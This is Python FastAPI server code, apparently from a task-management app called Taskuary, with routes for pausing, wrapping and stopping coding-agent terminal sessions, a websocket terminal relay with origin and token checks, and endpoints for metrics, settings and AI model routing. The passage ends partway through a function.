def _wrap_task(tid: int, close: bool, sid: str = None, no_reply: bool = False, background: bool = False, then_close: bool = False):
    """The route's thin end of wrapup.wrap - which is also what a self-closing agent calls
    (selfclose.py), so "the agent decided it was done" and "you clicked Done" travel the
    same road and leave the same record."""
    try:
        if background:
            from . import writeup
            if close: raise ValueError('a write-up in the background keeps the task open; then_close closes it after')
            return writeup.start(store, tid, close=then_close, actor=ACTOR, no_reply=no_reply, sid=sid)
        return end_task(store, tid, close, ACTOR, sid, no_reply=no_reply)
    except ValueError as e: raise HTTPException(422, str(e))


def _pause_task(tid: int, sid: str = None):
    if not tid or not store.get_task(tid): raise HTTPException(422, 'this session is not on a task')
    # A general session already persists every turn. Pausing it only has to close the live
    # provider session; its complete conversation is the handover when the owner resumes.
    from . import general
    task = store.get_task(tid) or {}
    assistant = general.session_for(tid) if general.handles(task) else None
    # ...and it is the handover whether or not a provider session is still live: an API turn keeps
    # none once it has answered, and this used to fall through and refuse (owner, 2026-09-07).
    if assistant or (general.handles(task) and general.chat_rows(store, tid)):
        history = general.history(store, tid)
        note = next((m['content'][0]['text'] for m in reversed(history)
                     if m.get('role') == 'assistant' and m.get('content')), '')
        if assistant: hub_term.close(assistant.sid)
        store.add_comment(tid, ACTOR, 'human', 'Paused the assistant session - the conversation is saved here for later.')
        store.audit('terminal', tid, 'pause', ACTOR,
                    detail={'sid': sid or getattr(assistant, 'sid', None), 'mode': 'assistant'})
        return {'pause': 'done', 'taskId': tid,
                'note': note or 'Conversation saved. Continue here when you are ready.'}
    text, agent, found = hub_term.transcript_for(store, tid)
    if not text.strip(): raise HTTPException(422, 'nothing to save - this task has no session transcript')
    note = pause_note(store, tid, text)
    if found: hub_term.close(found)
    store.add_comment(tid, agent, 'agent', f'{PAUSE_MARKER}\n{note}')
    store.add_comment(tid, ACTOR, 'human', 'Paused the session - picking this up later.')
    store.audit('terminal', tid, 'pause', ACTOR, detail={'sid': sid or found})
    return {'pause': 'done', 'taskId': tid, 'note': note}


@app.post('/api/tasks/{task_id}/wrap')
def wrap_task(task_id: int, body: WrapBody):
    """"We're done" - and it asks the agent NOTHING. The transcript is already on screen, so we
    take it, end the session, and let the main AI turn it into the report; the responder drafts
    the reply from that report and the task waits on you to send it. Typing a wrap-up prompt into
    the pty meant one more prompt to read, minutes of waiting, and a fresh chance for an agent you
    just stopped to go do more work."""
    return _wrap_task(task_id, body.close, no_reply=body.no_reply, background=body.background, then_close=body.then_close)

@app.post('/api/tasks/{task_id}/pause')
def pause_task(task_id: int, body: WrapBody):
    """Stop for now WITHOUT throwing the work away. Killing a session used to lose everything it
    had worked out - the pty dies, the scrollback goes, and the next session starts from nothing.
    This writes the handover note first (from the transcript, by the main AI), files it on the
    task, and hands it to whoever resumes: the next session is seeded with it. The task stays
    open - pausing is not finishing, so no report and no reply draft."""
    return _pause_task(task_id)

@app.post('/api/terminals/{sid}/wrap')
def wrap_terminal(sid: str, body: WrapBody):
    """Same thing, addressed by session - what the terminal pane itself has a handle on."""
    t = hub_term.get(sid)
    return _wrap_task(body.task_id or (t.task_id if t else None), body.close, sid, background=body.background, then_close=body.then_close)

@app.post('/api/terminals/{sid}/pause')
def pause_terminal(sid: str, body: WrapBody):
    t = hub_term.get(sid)
    return _pause_task(body.task_id or (t.task_id if t else None), sid)

@app.delete('/api/terminals/{sid}')
def close_terminal(sid: str):
    session = hub_term.get(sid)
    if not session: raise HTTPException(404, 'terminal not found')
    # X ends the worker, not the task. A deliberate Done/Wrap takes the routes above; a plain
    # close must immediately put abandoned in-progress work back in front of the owner.
    tid = getattr(session, 'task_id', None)
    if tid:
        hub_term.release_task(store, tid, ACTOR,
                              'Closed the agent session. The task is open again - nobody is working it.')
        from . import funnel as _funnel
        _funnel.invalidate()
    if not hub_term.close(sid): raise HTTPException(404, 'terminal not found')
    return {'ok': True}

@app.post('/api/tasks/{task_id}/agent/stop')
def stop_task_agent(task_id: int):
    """End only the current worker. The task and reply are separate state machines."""
    task = store.get_task(task_id)
    if not task: raise HTTPException(404, 'task not found')
    _refresh_chat_context(task_id=task_id)
    live = hub_term.session_for(task_id)
    if not live or not getattr(live, 'alive', False):
        return {'stopped': False, 'taskStatus': task.get('Status')}
    sid = live.sid
    label = getattr(live, 'label', None) or getattr(live, 'agent', None) or 'agent'
    stopped = bool(hub_term.close(sid))
    if stopped:
        from . import workerstate as ws
        ws.record(store, task_id, sid, 'stopped', text='stopped by the owner', source='owner')   # never a completion (PW-222)
        # ...and the task is no longer being worked. Nothing moved it out of 'in_progress' and the
        # run row stayed 'running', so the pipe showed "agent working" on a task with no session and
        # nothing for the owner to do, for ever (the 2026-09-03 break test).
        for r in store.list_runs(task_id):
            if r.get('Status') == 'running': store.update_run(r['RunId'], {'Status': 'stopped'}, finished=True)
        if task.get('Status') == 'in_progress':
            store.update_task(task_id, {'Status': 'open'}, ACTOR)
        hub_term.release_held(store, task_id, ACTOR)          # a reply held while it worked is back for your yes (A6)
        store.add_comment(task_id, ACTOR, 'human',
                          f'Stopped the {label} session. The task is open again - nobody is working it.'
                          if task.get('Status') == 'in_progress' else f'Stopped the {label} session. The task remains {task.get("Status")}.')
        store.audit('terminal', task_id, 'stop', ACTOR,
                    detail={'sid': sid, 'agent': getattr(live, 'agent', None),
                            'taskStatus': task.get('Status')})
    return {'stopped': stopped, 'taskStatus': (store.get_task(task_id) or {}).get('Status')}

def _ws_ok(ws: WebSocket) -> bool:
    """The HTTP middleware never runs for a websocket, so the same three questions are asked here.
    A browser cannot put a header on a websocket, so the token rides on the query string - but a
    caller that CAN set headers (the test client, a script) may send it that way. Origin matters
    most of all here: a websocket is exempt from the same-origin policy, so any page may open one
    to localhost, and this socket is a keyboard attached to a coding agent (audit 2026-09-02, F03).
    """
    if demo.enabled(): return True
    if not guard.host_ok(ws.headers.get('host'), cfg['server']): return False
    if not guard.origin_ok(ws.headers): return False
    # a stranger's session is refused every socket, even on an install with no owner token (R28)
    if any(guard.stranger_tid(cfg['server'], v) is not None for v in (ws.query_params.get('token'), ws.headers.get('x-taskuary-token'))): return False
    tok = cfg['server'].get('token')
    return not tok or guard.token_matches(ws.query_params.get('token'), tok) \
        or guard.token_matches(ws.headers.get('x-taskuary-token'), tok)


# The pane fits itself to its box, so the pty grows after output exists. ConPTY keeps a grown
# viewport top-anchored (cursor on its old row, blank rows below) while xterm pulls scrollback
# in and moves the cursor down - the CLI's next cursor move then lands mid-pane. The pane fixes
# that with xterm's windowsPty option, but only if it knows which pty it is watching.
def geom_frame(t, owner):
    win = sys.platform == 'win32'
    # `free`: nobody drives it - a pane on screen that is not the owner takes it (TerminalView: a geom frame with free)
    return {'type': 'geom', 'rows': int(t.rows), 'cols': int(t.cols), 'owner': bool(owner), 'free': getattr(t, 'geom_owner', None) is None,
            'conpty': win,
            'build': sys.getwindowsversion().build if win else None}   # ConPTY reflows only from 21376; xterm follows the build

@app.websocket('/api/terminals/{sid}/ws')
async def terminal_ws(ws: WebSocket, sid: str):
    """Bytes out, keystrokes in. The HTTP token gate can't see websockets, so _ws_ok asks the
    same questions the middleware would have."""
    t = hub_term.get(sid)
    if not _ws_ok(ws): return await ws.close(code=4401)
    if not t: return await ws.close(code=4404)
    await ws.accept()
    q = asyncio.Queue()
    t.subscribe(asyncio.get_running_loop(), q)
    # The first pane on this session drives its geometry; the rest render at what it chose.
    # `q` is already a per-socket identity and is already dropped in `finally`, so it is the token.
    # Three duck-typed classes serve this socket - Term, GeneralSession and demo.Replay - and they
    # share no base, so the token is read tolerantly rather than declared on each of them.
    if getattr(t, 'geom_owner', None) is None: t.geom_owner = q
    owns_geometry = lambda: getattr(t, 'geom_owner', None) is q
    input_q = asyncio.Queue()
    send_lock = asyncio.Lock()
    delivered, inflight = 0, 0
    redraw_boundary = None
    redraw_quiet = None
    redraw_cap = None

    async def send_frame(frame):
        # Output and the ready barrier come from separate tasks. One lock makes their order on
        # the wire exactly the order expressed below.
        async with send_lock: await ws.send_json(frame)

    async def finish_redraw(delay: float):
        """Send ready after the resize-driven repaint goes quiet, not after resize() returns."""
        nonlocal redraw_boundary, redraw_quiet, redraw_cap
        try: await asyncio.sleep(delay)
        except asyncio.CancelledError: return
        if redraw_boundary is None: return
        redraw_boundary = None
        if redraw_quiet and redraw_quiet is not asyncio.current_task(): redraw_quiet.cancel()
        if redraw_cap and redraw_cap is not asyncio.current_task(): redraw_cap.cancel()
        redraw_quiet = redraw_cap = None
        await send_frame({'type': 'ready'})

    async def to_browser():
        nonlocal delivered, inflight, redraw_quiet, redraw_cap
        while True:
            data = await q.get()
            if data is None: return await send_frame({'type': 'exit'})
            if data is hub_term.RESIZED:
                delivered += 1; await send_frame(geom_frame(t, owns_geometry())); continue
            # Codex repaints its WHOLE screen for every keystroke, and ConPTY hands that back in
            # several reads. One websocket frame - and one xterm parse - per read meant a fast
            # sentence typed its own repaints into a backlog the echo had to queue behind, which
            # is what "typing is really slow" was. Drain whatever is already waiting and send it
            # as one ordered chunk, exactly as to_pty() does for keystrokes. Nothing is dropped:
            # this only changes how many frames the same bytes arrive in.
            chunks, ended, resized = [data], False, False
            while True:
                try: more = q.get_nowait()
                except asyncio.QueueEmpty: break
                if more is None: ended = True; break     # the exit marker keeps its place in the order
                if more is hub_term.RESIZED: resized = True; break   # ...and so does a resize: bytes before it, geom, bytes after
                chunks.append(more)
            inflight += 1
            try: await send_frame({'type': 'out', 'data': ''.join(chunks),
                                   # Devin accepts the argv prompt immediately but does not paint
                                   # it until its first model turn returns. Tell the pane the truth
                                   # during that otherwise blank-looking interval.
                                   'promptPending': hub_term.prompt_pending(t),
                                   'cli': hub_term.cli_of(t.argv)})
            finally: inflight -= 1
            delivered += len(chunks) + resized
            if resized: await send_frame(geom_frame(t, owns_geometry()))
            # Ignore output that was already queued when the resize began. The first new chunk
            # and every repaint chunk after it move the quiet barrier; ready follows the burst.
            if redraw_boundary is not None and delivered >= redraw_boundary:
                # The cap is only a no-output fallback. Once repaint bytes arrive, quiet after
                # the LAST chunk is the barrier; a fixed cap exposed a long Codex redraw while it
                # was still painting line by line.
                if redraw_cap:
                    redraw_cap.cancel()
                    redraw_cap = None
                if redraw_quiet: redraw_quiet.cancel()
                redraw_quiet = asyncio.create_task(finish_redraw(.09))
            if ended: return await send_frame({'type': 'exit'})
    pump = asyncio.create_task(to_browser())

    async def to_pty():
        """Drain the socket independently of ConPTY and fold its queued keystrokes into one write.

        pywinpty writes are synchronous and can take a visible beat while Codex is repainting.
        Calling one directly from the receive loop made a fast sentence arrive one character per
        beat. The first character may still be in flight, but the rest collect here and cross the
        PTY in one ordered byte stream instead of paying that cost for every key.
        """
        while True:
            data = await input_q.get()
            chunks = [data]
            while True:
                try: chunks.append(input_q.get_nowait())
                except asyncio.QueueEmpty: break
            await asyncio.to_thread(t.write, ''.join(chunks))
    input_pump = asyncio.create_task(to_pty())
    try:
        # RENDERED, not raw (terminal.replay_text): the raw bytes of a full-screen TUI replay as
        # debris in a fresh xterm, and the live repaint then appends to that debris. Flagged as a
        # REPLAY so the browser holds the curtain over it until the live screen is up.
        # A geometry change can repaint the screen. None of that is the agent doing anything, and
        # counting it as output reset idle(): a session parked on a dialog read as working again
        # every time its card was opened (2026-09-03).
        t.quiet_for(ATTACH_QUIET)
        # Say who owns the geometry BEFORE any output: a pane that is not the owner must render at
        # the pty's width rather than fit its own box, or it wraps where the child did not - which
        # is the same corruption by a different road.
        await send_frame(geom_frame(t, owns_geometry()))
        if t.scrollback():
            # Drawn on the replay worker, never on the loop: here it froze every other socket - the Wall's typing - for
            # 1-5 s a pane. The send lock is held across the draw so live output that lands meanwhile still follows the
            # replay on the wire, as it did when nothing else could run.
            async with send_lock:
                snap = await asyncio.get_running_loop().run_in_executor(hub_term.REPLAYS, hub_term.replay_snapshot, t)
                if snap: await ws.send_json({'type': 'out', 'replay': True, 'data': snap,
                                             'promptPending': hub_term.prompt_pending(t),
                                             'cli': hub_term.cli_of(t.argv)})
        first_resize = True
        while True:
            m = await ws.receive_json()
            if m.get('type') == 'in': input_q.put_nowait(m.get('data') or '')
            # A pane put out of sight stays connected so showing it again is instant - and must not keep the geometry while
            # it is away, or the surface you are looking at renders at the size of one you are not.
            elif m.get('type') == 'release':
                if owns_geometry():
                    t.geom_owner = None
                    # ...and every other pane is told it is free: the one on screen may have asked first and been refused, while
                    # this one still held it (the owner, 2026-10-15: the Wall's pane kept the size after switching back to Chat,
                    # and the task page drew Claude at the Wall cell's size - its input box below the pane)
                    for loop, other in list(getattr(t, 'subs', []) or []):
                        if other is q: continue
                        try: loop.call_soon_threadsafe(other.put_nowait, hub_term.RESIZED)
                        except RuntimeError: pass
            elif m.get('type') == 'resize':
                rows, cols = m.get('rows') or 32, m.get('cols') or 110
                # A free token is claimed by whoever asks next: close the task page and the Wall
                # inherits the pty rather than being stuck at the size the task page left behind.
                if getattr(t, 'geom_owner', None) is None: t.geom_owner = q
                if not owns_geometry():
                    # Not ours to change. Tell this pane what the geometry actually is - and lift
                    # its curtain, which the owner's road does through the redraw barrier below.
                    await send_frame(geom_frame(t, False))
                    if first_resize:
                        first_resize = False
                        await send_frame({'type': 'ready'})
                    continue
                if first_resize:
                    first_resize = False
                    # The rendered snapshot already hydrates a same-size reconnect. The old
                    # one-column wiggle forced Codex/Claude to repaint their entire TUI on every
                    # task switch, even when the geometry had not changed; large sessions then
                    # visibly replayed from the top for minutes. Same size means no child resize
                    # at all: reveal the snapshot and resume only live output.
                    if (int(rows), int(cols)) == (int(t.rows), int(t.cols)):
                        await send_frame({'type': 'ready'})
                        continue
                    # For a real geometry change, request exactly one resize. The child repaints
                    # asynchronously, so output beyond this boundary is the new live screen.
                    redraw_boundary = delivered + inflight + q.qsize() + 1
                    redraw_cap = asyncio.create_task(finish_redraw(.35))
                elif (int(rows), int(cols)) == (int(t.rows), int(t.cols)):
                    # a kept pane coming back asks before it fits itself; already the right size, it still needs the answer
                    await send_frame(geom_frame(t, owns_geometry()))
                    continue
                t.resize(rows, cols)
                # A real pty says it changed size (Term emits RESIZED, and every pane hears it); a general session and the demo's
                # replay change theirs silently, so the pane that just took the geometry was never told it owns it and went on
                # drawing at the old size (2026-10-15, Chat after the Wall). Say it to this pane directly.
                if not isinstance(t, hub_term.Term): await send_frame(geom_frame(t, owns_geometry()))
                # ...and the next session opens at this size instead of being grown into it. A store write: off the loop, and after
                # the pane's answer, so a store held by a sync never delays it (2026-10-23)
                await run_in_threadpool(hub_term.remember_geometry, store, rows, cols)
    except (WebSocketDisconnect, RuntimeError, ValueError):
        pass
    finally:
        if owns_geometry(): t.geom_owner = None        # the next pane to refit inherits the pty
        t.unsubscribe(q); pump.cancel(); input_pump.cancel()
        if redraw_quiet: redraw_quiet.cancel()
        if redraw_cap: redraw_cap.cancel()

# ── the knowledge base (knowledge.py): the card's Reindex button; searching goes through /api/tools/run (kb_search) ──
class ReindexBody(BaseModel): connector_id: int | None = None

@app.post('/api/knowledge/reindex')
def knowledge_reindex(body: ReindexBody):
    """Walk the Knowledge base card's sources now and refresh the index. Long for a big library -
    the response carries what was indexed, skipped, removed and any file that would not read."""
    from . import knowledge
    r = knowledge.reindex(store, body.connector_id)
    store.audit('connector', body.connector_id or 0, 'reindex', ACTOR, detail={k: v for k, v in r.items() if k != 'errors'})
    return {'ok': not r['errors'] or r['indexed'] > 0, **r}

@app.get('/api/knowledge/search')
def knowledge_search(q: str, limit: int = 8, connector_id: int | None = None):
    """Ranked passages for a question - what the card's search box shows."""
    from . import knowledge
    return {'data': knowledge.search(store, q, max(1, min(50, limit)), connector_id)}

# ── the semantic layer (semantic.py): business numbers proved against known ones ──
class MetricBody(BaseModel):
    Name: str | None = None; Label: str | None = None; Grain: str | None = None
    Definition: str | None = None; Spec: dict | None = None; Notes: str | None = None
    ConnectorId: int | None = None

class FixtureBody(BaseModel):
    """One number the owner already knows is right - the only thing that can prove a definition."""
    Scope: str | None = None; Period: str | None = None
    Expected: float; Tolerance: float | None = None; Source: str | None = None

class TryBody(BaseModel): scope: str | None = None; period: str | None = None

def _metric_row(m: dict) -> dict:
    return {**m, 'Spec': json.loads(m.get('SpecJson') or '{}'), 'fixtures': store.list_fixtures(m['MetricId'])}

@app.get('/api/semantic/metrics')
def metrics_list(status: str = None):
    """Every definition with its known numbers and whether they still reconcile."""
    from . import semantic
    return {'data': [_metric_row(m) for m in store.list_metrics(status)], 'minFixtures': semantic.MIN_FIXTURES}

@app.post('/api/semantic/metrics')
def metric_save(body: MetricBody):
    """Write (or rewrite) a definition. Saving NEVER makes it trusted - only check() does, and
    editing the spec of a verified metric puts it back to draft, because the proof was of the
    old query and nothing has proved the new one."""
    if not (body.Name or '').strip(): raise HTTPException(422, 'a metric needs a name')
    old = store.metric_by_name(body.Name)
    fields = {'Name': body.Name, 'Label': body.Label, 'Grain': body.Grain, 'Definition': body.Definition,
              'Notes': body.Notes, 'ConnectorId': body.ConnectorId}
    if body.Spec is not None: fields['SpecJson'] = json.dumps(body.Spec)
    if old and body.Spec is not None and json.dumps(body.Spec) != (old.get('SpecJson') or ''):
        fields['Status'] = 'draft'
    mid = store.save_metric({k: v for k, v in fields.items() if v is not None}, ACTOR)
    store.audit('metric', mid, 'save', ACTOR, detail={'name': body.Name, 'respec': bool(old and fields.get('Status'))})
    return _metric_row(store.get_metric(mid))

@app.delete('/api/semantic/metrics/{mid}')
def metric_delete(mid: int):
    if not store.get_metric(mid): raise HTTPException(404, 'no such metric')
    store.delete_metric(mid); store.audit('metric', mid, 'delete', ACTOR)
    return {'ok': True}

@app.post('/api/semantic/metrics/{mid}/fixtures')
def metric_add_fixture(mid: int, body: FixtureBody):
    if not store.get_metric(mid): raise HTTPException(404, 'no such metric')
    fid = store.add_fixture(mid, body.model_dump(), ACTOR)
    store.audit('metric', mid, 'fixture_add', ACTOR, detail={'scope': body.Scope, 'period': body.Period, 'expected': body.Expected})
    return _metric_row(store.get_metric(mid)) | {'fixtureId': fid}

@app.delete('/api/semantic/fixtures/{fid}')
def metric_drop_fixture(fid: int):
    store.delete_fixture(fid)
    return {'ok': True}

@app.post('/api/semantic/metrics/{mid}/try')
def metric_try(mid: int, body: TryBody = None):
    """Run the definition once WITHOUT recording anything - the exploration step. This is how a
    definition gets to the point of being worth proving: try it on a facility, look at the
    number, adjust the spec, try again."""
    from . import semantic
    m = store.get_metric(mid)
    if not m: raise HTTPException(404, 'no such metric')
    body = body or TryBody()
    try: return semantic.evaluate(store, m, body.scope, body.period)
    except Exception as e: raise HTTPException(422, str(e)[:400])

@app.post('/api/semantic/metrics/{mid}/check')
def metric_check(mid: int):
    """Re-prove it against every known number. The only road to 'verified' - and the road back."""
    from . import semantic
    if not store.get_metric(mid): raise HTTPException(404, 'no such metric')
    try: return semantic.check(store, mid, ACTOR)
    except ValueError as e: raise HTTPException(422, str(e))

# ── the agent's browser, beside its terminal (browserview.py) ──
@app.get('/api/terminals/{sid}/browser')
def terminal_browser(sid: str):
    """Is a browser open for this session, and on what page - read from agent-browser's state
    files, so the pane can appear when the agent opens a page and fold when it closes."""
    from . import browserview, terminal
    st = browserview.state(sid)
    # ...and the page it is on is kept against its task, so a restart reopens it (browserview.keep_page)
    tid = getattr(terminal.SESSIONS.get(sid), 'task_id', None)
    if tid and st.get('url'): browserview.keep_page(tid, st['url'])
    return st

class SnapBody(BaseModel): task_id: int | None = None

@app.post('/api/terminals/{sid}/browser/snapshot')
def terminal_browser_snapshot(sid: str, body: SnapBody):
    """Keep the frame on the task record: a JPEG attachment plus a comment naming the page."""
    from . import browserview
    try: return browserview.snapshot(store, sid, ACTOR, body.task_id)
    except ValueError as e: raise HTTPException(422, str(e))

class OpenUrlBody(BaseModel):
    url: str

@app.post('/api/terminals/{sid}/browser/open')
def terminal_browser_open(sid: str, body: OpenUrlBody):
    """Navigate the pane the owner is watching. Theirs to drive: the agent is told to hand the
    keyboard over for a password or a 2FA code, and until now there was nowhere to hand it to."""
    from . import browserview
    try: return {'url': browserview.navigate(sid, body.url)}
    except ValueError as e: raise HTTPException(422, str(e))

class ViewportBody(BaseModel):
    w: int
    h: int

@app.post('/api/terminals/{sid}/browser/viewport')
def terminal_browser_viewport(sid: str, body: ViewportBody):
    """The pane says what shape it is; the page is rendered that shape, so there is no letterbox."""
    from . import browserview
    return {'set': browserview.set_viewport(sid, body.w, body.h)}

@app.websocket('/api/terminals/{sid}/browser/ws')
async def terminal_browser_ws(ws: WebSocket, sid: str):
    """agent-browser's screencast, relayed: frames out, the owner's input back when they take over.
    Same rule as the terminal socket."""
    from . import browserview
    if not _ws_ok(ws): return await ws.close(code=4401)
    await browserview.relay(ws, sid)

@app.get('/api/health')
def health():
    """Unauthenticated on purpose: a container HEALTHCHECK needs a pulse without the LAN token."""
    return {'ok': True}

@app.get('/api/demo')
def demo_state():
    """Is this a demo instance? The banner asks; nothing else depends on it."""
    return {'demo': demo.enabled(), 'owner': demo.OWNER if demo.enabled() else ''}

@app.get('/api/build')
def build():
    """Which UI bundle is on disk right now.

    Taskuary updates underneath an open tab - a git pull, a rebuild, `pip install -U` - and the
    tab goes on running the JavaScript it loaded at breakfast. Every symptom of that looks like
    a bug that was already fixed, and the owner has no way to tell the difference from inside
    the page. So the page asks, and says "reload" when the answer stops matching what it loaded.
    """
    # `version` is the process; `disk_version` is pyproject.toml right now. They part company the
    # moment a pull bumps the number under a running server - and until the owner restarts, the
    # header pill, /api/version and the CLI banner all report the old one. The page says so.
    from . import _version
    try:
        html = (_web_root / 'index.html').read_text(encoding='utf-8')
        return {'asset': (re.search(r'assets/(index-[A-Za-z0-9_-]+\.js)', html) or [None, ''])[1],
                'version': _ver, 'disk_version': _version()}
    except OSError:
        return {'asset': '', 'version': _ver, 'disk_version': _version()}

@app.get('/api/connectors/catalog')
def connectors_catalog():
    """Every card, working or planned, from the one catalogue file both the tab and the report read."""
    from . import connectorcatalog
    return {'data': connectorcatalog.cards()}


@app.get('/api/assistant/blocks')
def assistant_blocks(source_id: int = None, blocks: str = None, taskuary: str = None):
    """What an Assistant report reads, priced. `source_id` names the report whose choice to resolve;
    absent means the declared defaults, which is what a new report starts from. `blocks` is the
    choice the owner is making RIGHT NOW, as JSON, before they have saved it - without it the card
    would price the saved report while showing the edited one, which is the kind of disagreement
    between a page and its data this whole feature exists to end.

    One resolution feeds both this and the run (assistantblocks.resolve), so the card cannot claim a
    read the payload never made. `cost` stays None until the brain's price is known - the money line
    is Task 3's, and a field that exists and says nothing beats a number that is a guess."""
    from . import assistantblocks as blk
    from .reports import runs_per_day
    cfg = {}
    if source_id:
        src = store.get_source(int(source_id))
        # a card that asks about a report that is not there must not be answered with the DEFAULTS:
        # it would show a confident picture of a configuration nobody saved
        if not src: raise HTTPException(404, f'no source {source_id}')
        try: cfg = json.loads(src.get('ConfigJson') or '{}')
        except ValueError: cfg = {}
        if cfg.get('type') != 'assistant': raise HTTPException(404, f"source {source_id} is a {cfg.get('type') or 'rest'} report, not an Advisor")
    if blocks is not None:
        # the unsaved choice wins over the saved one. A malformed string is the owner's editor
        # mid-keystroke, not an attack: price the saved report rather than 400 at them.
        try: cfg = {**cfg, 'blocks': json.loads(blocks)}
        except ValueError: logger.debug('assistant blocks: the page sent a blocks value that is not JSON; pricing what is saved')
    if taskuary is not None:
        # the cards the owner is drawing RIGHT NOW (the page since 2026-09-20) - same rule as `blocks`
        try: cfg = {**cfg, blk.KEY: json.loads(taskuary)}
        except ValueError: logger.debug('assistant blocks: the page sent a taskuary value that is not JSON; pricing what is saved')
    chosen = blk.resolve(store, cfg)
    rows = blk.weighed(store, chosen, report_id=int(source_id) if source_id else None)
    # the live blocks are ON and cost nothing HERE, which is not the same as costing nothing. Named
    # so the card can say "and a live call to your calendar" instead of printing a total that reads
    # as zero for exactly the report that costs the most.
    unpriced = [{'id': r['id'], 'label': r['label']} for r in rows if r['on'] and r['live']]
    return {'data': rows, 'cards': blk.price_cards(rows, chosen), 'total_tokens': sum(r['tokens'] for r in rows if r['on']),
            'runs_per_day': runs_per_day(cfg), 'cost': None, 'unpriced': unpriced,
            'reads_taskuary': blk.reads_taskuary(chosen)}


@app.get('/api/audit/assistant')
def audit_assistant(limit: int = 60):
    """What the assistant changed, newest first - the rows its handlers audit as `assistant` (settings,
    reports, connections). Settings -> Configuration shows them - a record, with no undo (the owner, 2026-10-19)."""
    limit = max(1, min(limit, 200))      # SQLite reads LIMIT -1 as no limit at all
    rows = [r for r in store.list_audit(limit=max(limit * 5, 200)) if r.get('Actor') == 'assistant'][:limit]
    out = []
    for r in rows:
        try: d = json.loads(r.get('Detail') or '{}') if str(r.get('Detail') or '').startswith('{') else {'detail': r.get('Detail')}
        except ValueError: d = {'detail': r.get('Detail')}
        out.append({'when': r.get('CreatedAt'), 'entity': r.get('EntityType'), 'id': r.get('EntityId'), 'action': r.get('Action'), 'detail': d})
    return {'data': out}


@app.get('/api/settings')
def settings():
    """Every knob, with the value it SHIPS with beside the value it has.

    "Explain them better" starts with the one fact no description contained: what this was before
    you touched it (the owner, 2026-09-16). Writing that into 55 description strings would be 55
    places to drift out of step with store.DEFAULT_SETTINGS; the page reads it from the same dict
    the install was seeded from, so it cannot disagree with what actually shipped."""
    from .store import DEFAULT_SETTINGS
    # `assistant_notes*` is a check's private memory of its own last run, one key per report
    # (assistant.notes_key) - bookkeeping, not a knob, however many reports there are
    rows = [s for s in store.list_settings() if s['Name'] not in ('ingest_status', 'assistant_last_run', 'pane_geometry', 'pane_theme')
            and not s['Name'].startswith('report_last_run:') and not s['Name'].startswith('assistant_notes')]
    return {'data': [{**r, 'Default': DEFAULT_SETTINGS.get(r['Name'])} for r in rows]}

@app.patch('/api/settings')
def set_setting(body: SettingBody):
    from . import settings_schema
    if why := settings_schema.refuse(body.name, body.value): raise HTTPException(422, why)
    prev = store.get_setting(body.name)
    store.set_setting(body.name, body.value, ACTOR)
    store.audit('setting', 0, 'set', ACTOR, detail={'key': body.name, 'from': prev, 'to': body.value})   # as the chat's setting.set does
    # the share-only listener follows its switch and its port at once (sharing.sync_listener)
    if body.name in ('share_links_lan', 'share_port'):
        from . import sharing
        why = sharing.sync_listener(store)
        if why: return {'ok': True, 'warning': why}
    return {'ok': True}

@app.get('/api/assistant/doorways')
def assistant_doorways():
    """Where the assistant can be reached, per channel - for Settings -> Assistant on your phone."""
    from . import remote_assistant
    return {'data': remote_assistant.doorway_state(store),
            'standing': store.get_setting('phone_assistant') == '1'}

class DoorwayBody(BaseModel):
    channel: str
    chat: str = ''

class ListensBody(BaseModel):
    channel: str
    listens: str

@app.post('/api/assistant/doorways')
def set_assistant_doorway(body: DoorwayBody):
    """Give the assistant a chat on that channel, or '' to take it back."""
    from . import remote_assistant
    was = next((remote_assistant.chat_of(c) for c in store.connectors_by_type(body.channel, with_secret=True) or [] if c and c.get('Active')), '')
    try: out = remote_assistant.use_chat(store, body.channel, body.chat)
    except ValueError as e: raise HTTPException(422, str(e))
    # ...and a Telegram chat just picked says hello (A4): picking it sent nothing. Off the request - a slow bot never holds the page
    if body.channel == 'telegram' and out.get('chat') and out['chat'] != was:
        def hello():
            try: remote_assistant.hello_chat(store, 'telegram', out['chat'])
            except Exception as e: logger.warning(f'telegram: the hello to the chosen chat did not go - {e}')
        threading.Thread(target=hello, daemon=True, name='telegram-hello').start()
    return out

@app.post('/api/assistant/doorways/listens')
def set_assistant_listens(body: ListensBody):
    """When that channel may listen: any time, or only while a walk is handed to it."""
    from . import remote_assistant
    try: return remote_assistant.set_listens(store, body.channel, body.listens)
    except ValueError as e: raise HTTPException(422, str(e))

@app.get('/api/ai/routes')
def ai_routes(task: int = None, limit: int = 20):
    """The newest brain routes - which AI each call ran on and why - for one task or all. Read-only; no prompt or answer is kept."""
    if task is None: return {'routes': _brainroute().recent(store, limit=max(1, min(int(limit), 200)))}
    return {'routes': store.brain_routes(task, limit=max(1, min(int(limit), 200)))}


class RouteRulesBody(BaseModel):
    mode: str = None                    # 'fixed' | 'auto'; None = leave alone
    rules: list = None                  # the whole ordered list; None = leave alone
    cap: str = None                     # strong calls a day; '' = no cap; None = leave alone


@app.get('/api/ai/route_rules')
def ai_route_rules():
    """The router's part of Settings: the mode line, the rules as sentences with their switches, the day's cap and what used it."""
    return _brainroute().panel(store)


@app.post('/api/ai/route_rules')
def set_ai_route_rules(body: RouteRulesBody):
    try: out = _brainroute().set_panel(store, body.mode, body.rules, body.cap, ACTOR)
    except ValueError as e: raise HTTPException(422, str(e))
    store.audit('setting', 0, 'route_rules', ACTOR, detail={k: v for k, v in (('mode', body.mode), ('cap', body.cap)) if v is not None}
                | ({'rules': len(body.rules)} if body.rules is not None else {}))
    return out


class JudgedBody(BaseModel):
    difficulty: str = None              # quick | standard | hard
    data_class: str = None              # ordinary | sensitive


@app.post('/api/tasks/{task_id}/judged')
def correct_judged(task_id: int, body: JudgedBody):
    """The owner's correction of how hard a task's work is, or what data it carries. It stands over triage's next reading, and
    it teaches triage the way every other correction does (routingmemory) - the next message like it is judged with it in view."""
    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    if body.difficulty not in (None, 'quick', 'standard', 'hard'): raise HTTPException(422, 'difficulty is quick, standard or hard')
    if body.data_class not in (None, 'ordinary', 'sensitive'): raise HTTPException(422, 'the data is ordinary or sensitive')
    v = {k: x for k, x in (('difficulty', body.difficulty), ('data_class', body.data_class)) if x}
    if not v: raise HTTPException(422, 'say what to correct')
    store.judge_task(task_id, v, 'owner')
    from . import routingmemory
    for k, x in v.items(): routingmemory.learn_correction(store, task_id, k, x, ACTOR)
    store.audit('task', task_id, 'judged', ACTOR, detail=v)
    return {'judged': _brainroute().judged(store, task_id)}


def _strong_again_of(task: dict) -> tuple:
    """(job, pick, model) a re-run on the strong model would use for this task - its last brain first - or ('', '', '')."""
